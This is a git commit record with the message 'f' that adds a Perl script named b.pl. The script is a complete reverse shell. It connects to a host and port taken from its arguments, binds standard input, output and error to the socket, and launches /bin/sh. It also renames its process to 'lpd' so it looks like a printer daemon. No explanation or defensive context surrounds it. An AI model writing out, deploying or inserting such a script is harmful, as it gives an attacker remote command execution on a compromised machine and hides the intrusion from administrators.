fed6c3f8a45b20ae1ac5c9a4ee31b1338290a763
hithron <dreamhack@gmail.com>
2015-08-23 18:39:53 +0200

    f
    f

---
+++ b.pl
@@ -0,0 +1,21 @@
+#!/usr/bin/perl
+use Socket;
+$pamer="127.0.0.1/32\n\n";
+$cmd= "lpd";
+$system= '/bin/sh';
+$0=$cmd;
+$target=$ARGV[0];
+$port=$ARGV[1];
+$iaddr=inet_aton($target) || die("Error: $!\n");
+$paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");
+$proto=getprotobyname('tcp');
+socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
+connect(SOCKET, $paddr) || die("Error: $!\n");
+open(STDIN, ">&SOCKET");
+open(STDOUT, ">&SOCKET");
+open(STDERR, ">&SOCKET");
+print STDOUT $pamer;
+system($system);
+close(STDIN);
+close(STDOUT);
+close(STDERR);
